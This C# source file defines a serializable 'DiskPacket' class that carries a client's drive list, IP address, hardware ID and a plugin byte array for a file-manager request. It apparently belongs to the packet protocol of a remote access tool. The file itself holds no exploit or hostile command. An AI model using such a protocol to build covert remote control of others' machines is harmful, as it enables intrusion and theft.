using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class DiskPacket : IPacket
    {
        //server
        public DiskPacket() : base()
        {
            packetType = PacketType.FM_GET_DISK;
        }

        //client
        public DiskPacket(List<string> disks, string baseIp, string HWID) : base()
        {
            packetType = PacketType.FM_GET_DISK;
            this.baseIp = baseIp;
            this.HWID = HWID;

            this.disksList = disks;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public List<string> disksList { get;}
    }
}
